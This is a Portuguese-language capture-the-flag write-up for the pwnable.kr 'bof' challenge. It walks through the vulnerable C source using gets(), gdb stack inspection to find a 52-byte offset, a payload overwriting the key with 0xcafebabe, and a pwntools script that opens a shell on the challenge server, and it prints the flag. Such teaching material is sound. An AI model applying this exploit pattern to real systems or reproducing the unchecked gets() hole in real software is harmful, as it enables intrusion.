# Duckware Team - bof (pwnable)

###### Solved by @0xpics and @JoaoPedroPiceli

> This CTF is about pwn, buffer overflow

## Sobre o desafio

O objetivo deste desafio é proporcionar ao usuário uma compreensão profunda dos princípios de buffer overflow, capacitando-o a identificar e explorar vulnerabilidades por meio da análise de código. Além disso, o desafio visa fortalecer a habilidade de compreender o funcionamento de cada função do código, utilizando ferramentas como um debugger para uma investigação detalhada e prática.

## O Desafio

Para realizarmos esse desafio devemos executar um arquivo que o site nos provém, `overflowme`, além disso o site também nos deu uma porta nc 'pwnable.kr',9000

Ao executarmos recebemos a seginte mensagem: *"overflow me : "*. Testando inputs de diversos tamanhos sempre recebemos a mesma resposta: *Nah..*

Sem mais o que fazer, vamos para a análise do código.

## O Código

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```

Para explorar o buffer overflow neste código, o objetivo é sobrescrever o valor da variável key na função func para que ela se torne 0xcafebabe. Isso permitirá executar system("/bin/sh") e obter um shell.


* A função func tem um buffer overflowme de 32 bytes.
* A função gets é usada para ler a entrada do usuário, o que é perigoso porque não verifica o tamanho da entrada, permitindo um buffer overflow.
* O valor de key é comparado com 0xcafebabe. Se for igual, um shell é executado.

Para relaizarmos o buffer precisaremos construir um payload, ele será construido da seguinte maneira:

`payload = "A" * offset + "endereço de memória`

## Construindo o payload

Para conseguirmos o endereço de memória nos iremos converter 0xcafebabe para seu formato little-endian. Nós fazemos isso pois a shell que queremos acessar só é acessível através do valor da key 0xcafebabe assim como indicado no código, sua conversão para little-endian se dá pelo fato que a maioria dos sistemas baseados em arquiteturas x86/x86-64 armazenam valores multi-byte na memória no formato little-endian, assim sua conversão é necessária para que o sistema a interprete corretamente.

`payload = "A" * offset + "\xbe\xba\xfe\xca"`

Agora calcularemos o offset.

Para isso precisamos achar a função `0xdeadbeef` através da ferramenta `gdb`

Para facilitar a compressão de como achar a função, irei mostrar sequência de ações que deve ser tomada no gdb.

```
(kali㉿kali)-[~/Downloads]
└─$ gdb ./bof
GNU gdb (Debian 16.2-1) 16.2
Copyright (C) 2024 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./bof...
(No debugging symbols found in ./bof)
(gdb) break func
Breakpoint 1 at 0x632
(gdb) run
Starting program: /home/kali/Downloads/bof 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x56555632 in func ()
(gdb) x/40wx $esp
0xffffcea0:     0x00000000      0xffffd18b      0x00000002      0xffffced8
0xffffceb0:     0xf7ffcfec      0x00000000      0x00000014      0x00000000
0xffffcec0:     0xf7fc6570      0xf7fc6000      0x00000000      0x00000000
0xffffced0:     0x00000000      0x00000000      0xffffffff      0xf7d79994
0xffffcee0:     0xf7fc0400      0x00000000      0xffffcf08      0x5655569f
0xffffcef0:     0xdeadbeef      0x00000000      0x00000000      0x00000000
0xffffcf00:     0x00000000      0x00000000      0x00000000      0xf7d8cd43
0xffffcf10:     0x00000001      0xffffcfc4      0xffffcfcc      0xffffcf30
0xffffcf20:     0xf7f9de14      0x5655568a      0x00000001      0xffffcfc4
0xffffcf30:     0xf7f9de14      0x565556b0      0xf7ffcb60      0x00000000
(gdb)
```

1. Identificando o buffer `overflowme`

O buffer `overflowme` é declarado como `char overflowme[32]` na função `func`. Ele será alocado na pilha. No despejo da pilha, o buffer começa no endereço `0xffffcebc`.

2. Identificando o valor de key

No despejo da pilha, o valor `0xdeadbeef` (que é o valor de key) aparece em `0xffffcef0`:
Copy

`0xffffcef0:     0xdeadbeef      0x00000000      0x00000000      0x00000000`

Portanto, `key` está localizado em `0xffffcef0`.

3. Calculando o offset

O buffer `overflowme` começa em `0xffffcebc`. O valor de key está em `0xffffcef0`. Para calcular o offset, subtraímos os endereços:

`0xffffcef0 - 0xffffcebc = 0x34 (52 em decimal)`

Portanto, o buffer `overflowme` tem 32 bytes, mas o valor de `key` está a 52 bytes do início do buffer. Isso significa que há um espaço adicional de 20 bytes entre o final do buffer e o valor de key.

4. Criando o payload

Para sobrescrever key com 0xcafebabe, precisamos preencher o buffer overflowme (32 bytes) e os 20 bytes adicionais, totalizando 52 bytes.

O payload será:

`payload = "A" * 52 + "\xbe\xba\xfe\xca"`

## Solução

Existem várias maneiras para executar esse payload, porém a que usaremos aqui será através de um script simples de python.

```
from pwn import *

payload = 'A' * 52 + '\xbe\xba\xfe\xca'
shell = remote('pwnable.kr',9000)
shell.send(payload)
shell.interactive()
```

1.O script cria um payload que explora o buffer overflow no servidor.

2.Conecta-se ao servidor pwnable.kr na porta 9000.

3.Envia o payload para o servidor.

4.Se o payload estiver correto, o servidor executará system("/bin/sh"), e o script entrará em modo interativo, permitindo que você execute comandos no servidor.

Quando executamos esse script conseguirmos ter acesso a shell, explorando um pouco conseguimos achar o arquivo da flag, que quando damos um cat nela nos dá essa flag:

>daddy, I just pwned a buFFer :)
